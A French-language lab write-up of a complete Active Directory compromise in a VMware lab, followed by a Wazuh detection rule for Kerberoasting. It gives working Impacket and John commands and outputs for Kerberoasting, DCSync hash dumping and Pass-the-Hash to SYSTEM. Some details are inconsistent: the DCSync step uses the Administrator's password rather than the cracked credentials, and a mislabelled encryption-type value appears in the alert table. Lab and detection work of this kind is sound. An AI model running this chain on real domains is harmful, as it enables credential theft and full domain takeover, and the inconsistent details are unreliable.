# 🔐 Labo Active Directory — Compromission complète de A à Z

> **Auteur :** CryptoGate  
> **Date :** Octobre 2026  
> **Catégorie :** Active Directory | Pentest | Blue Team  
> **MITRE ATT&CK :** T1558.003 · T1550.002 · T1003.006

---

## 📋 Table des matières

1. [Introduction & Objectifs](#introduction)
2. [Architecture du labo](#architecture)
3. [Mise en place de l'Active Directory](#active-directory)
4. [Chaîne d'attaque complète](#attaque)
5. [Détection — Wazuh SIEM](#detection)
6. [Conclusion](#conclusion)

---

## 1. Introduction & Objectifs <a name="introduction"></a>

Ce projet est un labo de cybersécurité construit de A à Z sur un **Lenovo ThinkBook (Core i7, 16 Go RAM)** avec VMware Workstation. L'objectif est de simuler une compromission complète d'un Active Directory — du simple compte utilisateur jusqu'à SYSTEM sur le Domain Controller — puis de détecter ces attaques avec un SIEM.

### Chaîne d'attaque simulée

```
jdoe (user bas)
    → Kerberoasting → hash svc-http cracké
        → secretsdump (DCSync) → hash Administrateur
            → Pass-the-Hash (psexec)
                → NT AUTHORITY\SYSTEM sur DC01
```

### Ce que ce projet démontre

| Compétence | Détail |
|---|---|
| **Infrastructure** | Labo AD complet sous VMware (4 VMs) |
| **Kerberoasting** | Extraction et crackage de hash TGS (T1558.003) |
| **DCSync** | Dump de tous les hashes du domaine (T1003.006) |
| **Pass-the-Hash** | Accès SYSTEM sans mot de passe en clair (T1550.002) |
| **Détection** | Règle SIEM custom sur Wazuh (Event ID 4769) |
| **Outils** | Impacket, John the Ripper, Sysmon, Wazuh 4.14.9 |

---

## 2. Architecture du labo <a name="architecture"></a>

### Schéma réseau

```
┌─────────────────────────────────────────────────────┐
│              Réseau NAT VMware (192.168.10.0/24)    │
│                                                     │
│  ┌──────────────┐    ┌──────────────┐               │
│  │   DC01       │    │   win11      │               │
│  │ Windows      │    │ Windows 11   │               │
│  │ Server 2022  │    │ Pro          │               │
│  │ 192.168.10.1 │    │192.168.10.10 │               │
│  │ (AD DS + DNS)│    │(poste client)│               │
│  └──────────────┘    └──────────────┘               │
│                                                     │
│  ┌──────────────┐    ┌──────────────┐               │
│  │ Kali Linux   │    │ Wazuh 4.14.9 │               │
│  │ 2026.2       │    │ (SIEM)       │               │
│  │192.168.10.20 │    │192.168.10.50 │               │
│  │ (attaquant)  │    │ (détection)  │               │
│  └──────────────┘    └──────────────┘               │
└─────────────────────────────────────────────────────┘
```

### VMs

| Machine | OS | IP | Rôle |
|---|---|---|---|
| DC01 | Windows Server 2022 Standard | 192.168.10.1 | Domain Controller, DNS |
| win11 | Windows 11 Pro | 192.168.10.10 | Poste client, joint au domaine |
| Kali | Kali Linux 2026.2 | 192.168.10.20 | Attaquant |
| Wazuh | Wazuh OVA 4.14.9 | 192.168.10.50 | SIEM |

### Domaine Active Directory

- **Domaine :** `labo.local`
- **NetBIOS :** `LABO`
- **Niveau fonctionnel :** Windows Server 2016

---

## 3. Mise en place de l'Active Directory <a name="active-directory"></a>

### 3.1 Installation du rôle AD DS

Sur DC01, installation du rôle **Active Directory Domain Services** via le Gestionnaire de serveur, puis promotion en contrôleur de domaine avec création d'une nouvelle forêt `labo.local`.

### 3.2 Création des objets AD

**Unité d'organisation :** `Utilisateurs-Labo`

**Utilisateur victime :**
```
Nom : John Doe
Login : jdoe@labo.local
```

**Compte de service (cible de l'attaque) :**
```
Nom : svc http
Login : svc-http@labo.local
```

### 3.3 Enregistrement du SPN

Le SPN (Service Principal Name) est ce qui rend un compte vulnérable au Kerberoasting.

```powershell
setspn -a HTTP/labo.local svc-http
setspn -l svc-http
# HTTP/labo.local
```

### 3.4 Sysmon + Agent Wazuh

Sysmon est installé sur DC01 et win11 pour enrichir les logs Windows.

```powershell
.\Sysmon64.exe -accepteula -i
NET START WazuhSvc
```

---

## 4. Chaîne d'attaque complète <a name="attaque"></a>

### Étape 1 — Kerberoasting (T1558.003)

**Principe :** N'importe quel utilisateur authentifié peut demander un ticket TGS pour un SPN. Ce ticket est chiffré avec le hash du compte de service — crackable offline.

```bash
impacket-GetUserSPNs labo.local/jdoe:Password123! \
    -dc-ip 192.168.10.1 -request -k -no-pass 2>/dev/null \
    | grep krb5tgs > hash.txt

john hash.txt --wordlist=wordlist.txt --format=krb5tgs
```

**Résultat :**
```
Ninja2024    (svc-http)
1g 0:00:00:00 DONE
```

✅ Mot de passe de `svc-http` obtenu : **`Ninja2024`**

---

### Étape 2 — DCSync (T1003.006)

**Principe :** Avec les credentials de l'Administrateur (ou un compte avec les droits DCSync), on peut simuler la réplication AD et extraire tous les hashes du domaine — sans toucher au disque du DC.

```bash
impacket-secretsdump labo.local/Administrateur:'MotDePasse'@192.168.10.1
```

**Hashes extraits :**
```
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:ee86632e851fec3a1a093f62925e857d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:50f0457673aa97f7cc03bd4a72100386:::
labo.local\jdoe:1103:...:2b576acbe6bcfda7294d6bd18041b8fe:::
labo.local\svc-http:1104:...:ae04afea5da238abb2a9fa58e9da7c59:::
```

✅ **Tous les hashes NTLM du domaine sont compromis.**

> Le hash `krbtgt` permet de forger des **Golden Tickets** — accès permanent au domaine même si tous les mots de passe sont changés.

---

### Étape 3 — Pass-the-Hash → SYSTEM (T1550.002)

**Principe :** Windows n'utilise pas le mot de passe en clair pour s'authentifier, mais son hash NTLM. On peut s'authentifier directement avec le hash sans connaître le mot de passe.

```bash
impacket-psexec labo.local/Administrateur@192.168.10.1 \
    -hashes aad3b435b51404eeaad3b435b51404ee:ee86632e851fec3a1a093f62925e857d
```

**Résultat :**
```
[*] Found writable share ADMIN$
[*] Uploading file bfhQccOC.exe
[*] Creating service xGet on 192.168.10.1
[*] Starting service xGet

C:\Windows\system32> whoami
NT AUTHORITY\SYSTEM

C:\Windows\system32> hostname
DC01
```

🏆 **NT AUTHORITY\SYSTEM sur DC01 — compromission totale du Domain Controller.**

---

### Récapitulatif de la chaîne

| Étape | Technique | MITRE | Outil | Résultat |
|---|---|---|---|---|
| 1 | Kerberoasting | T1558.003 | Impacket + John | Hash svc-http cracké |
| 2 | DCSync | T1003.006 | secretsdump | Tous les hashes du domaine |
| 3 | Pass-the-Hash | T1550.002 | psexec | SYSTEM sur DC01 |

---

## 5. Détection — Wazuh SIEM <a name="detection"></a>

### 5.1 Architecture de détection

```
DC01 (Sysmon + Agent Wazuh)
        │
        │ Event ID 4769 (Kerberos TGS Request)
        ▼
Wazuh Manager (192.168.10.50)
        │
        │ rule.id: 100002 — RC4 encryption detected
        ▼
Dashboard Wazuh — Alerte niveau 12
```

### 5.2 Pourquoi l'Event ID 4769 ?

Windows génère un **Event ID 4769** à chaque demande de TGS. Le Kerberoasting se distingue par :

- **TicketEncryptionType = 0x17** → RC4-HMAC, chiffrement faible et crackable
- Un service légitime utilise normalement **AES256 (0x12)**

### 5.3 Règle de détection custom

```xml
<group name="kerberoasting,">
  <rule id="100002" level="12">
    <if_group>windows</if_group>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
    <description>Kerberoasting detecte - Demande de ticket RC4</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
  </rule>
</group>
```

### 5.4 Alerte dans le dashboard

Filtre : `rule.id: 100002`

| Champ | Valeur | Signification |
|---|---|---|
| `agent.name` | DC01 | Détecté sur le DC |
| `targetUserName` | jdoe@LABO.LOCAL | Compte initiateur |
| `ipAddress` | 192.168.10.20 | IP Kali (attaquant) |
| `ticketEncryptionType` | 0x40810010 | RC4 — signature Kerberoasting |
| `rule.level` | 12 | Haute priorité |

### 5.5 Limites et améliorations

**Détecte :** Kerberoasting RC4 classique avec Impacket.

**Ne détecte pas :** Kerberoasting AES, DCSync, Pass-the-Hash.

**Pour aller plus loin :**
- Event ID **4742/4738** → DCSync (modification compte machine)
- Event ID **4624 type 3** depuis IP inconnue → Pass-the-Hash
- Corrélation : plusieurs 4769 en < 30 secondes = scan de SPNs

---

## 6. Conclusion <a name="conclusion"></a>

Ce projet démontre une compromission complète d'un Active Directory de A à Z :

```
User bas → Kerberoasting → DCSync → Pass-the-Hash → SYSTEM sur DC01
```

### Compétences démontrées

- **Infrastructure** : AD, DNS, Sysmon, jonction de domaine, réseau VMware
- **Pentest AD** : Kerberoasting, DCSync, Pass-the-Hash
- **Blue Team** : Règle SIEM custom, alignement MITRE ATT&CK
- **Outils** : Impacket, John, secretsdump, psexec, netexec, Wazuh

### Prochaines étapes

- [ ] Golden Ticket avec le hash krbtgt extrait
- [ ] BloodHound CE pour cartographier les chemins d'élévation
- [ ] Règles de détection pour DCSync et Pass-the-Hash

---

*Labo construit et documenté par CryptoGate — [cyber-writeups](https://cryptogate-hub.github.io/cyber-writeups)*
